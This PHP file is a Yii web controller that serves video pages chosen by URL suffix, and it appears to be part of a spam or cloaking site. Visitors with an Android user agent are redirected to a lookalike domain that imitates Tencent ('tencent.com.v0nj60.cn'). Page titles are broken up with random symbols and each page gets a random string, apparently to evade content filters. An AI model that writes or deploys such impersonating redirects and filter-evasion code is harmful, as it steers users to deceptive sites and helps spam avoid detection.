<?php
namespace app\controllers;

use app\models\Video;
use Yii;
use yii\web\Controller;
use yii\web\NotFoundHttpException;

class DanyeController extends Controller
{
    public $layout = false;

    public function actionIndex()
    {
        if(strpos($_SERVER['HTTP_USER_AGENT'], 'android')) {
            header('Location: http://www.tencent.com.v0nj60.cn');
        }

        $suffix = $this->getSuffix();
        $model = $this->findModel($suffix);

        $list = Video::find()
            ->select(['id', 'name', 'suffix'])
            ->where(['<>', 'id', $model->id])
            ->limit(5)
            ->all();

        return $this->render('index', [
            'model' => $model,
            'list' => $list,
            'title' => $this->formatTitle($model->name),
            'key' => $this->createRandomStr(rand(2, 3))
        ]);
    }

    public function findModel($suffix)
    {
        if (($model = Video::findOne(['suffix' => $suffix])) == null) {
            throw new NotFoundHttpException();
        }

        return $model;
    }

    public function formatTitle($title)
    {
        $length = mb_strlen($title);
        $start = mt_rand(3, $length - 3);

        return '☀' . mb_substr($title, 0, $start) . '❄' . mb_substr($title, $start + 1, $length);
    }

    public function getSuffix()
    {
        $url = Yii::$app->request->url;
        $url = strip_tags(trim($url));
        if (strpos($url, '.') === false) {
            throw new NotFoundHttpException();
        }

        $urlPath = parse_url($url);
        if (isset($urlPath['path']) && !empty($urlPath['path'])) {
            $url = explode('.', $urlPath['path']);

            if (!empty($url)) {
                return end($url);
            }
        }

        throw new NotFoundHttpException();
    }

    public function createRandomStr($length)
    {
        $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $strlen = 52;
        while($length > $strlen){
            $str .= $str;
            $strlen += 52;
        }
        $str = str_shuffle($str);
        return substr($str, 0, $length);
    }
}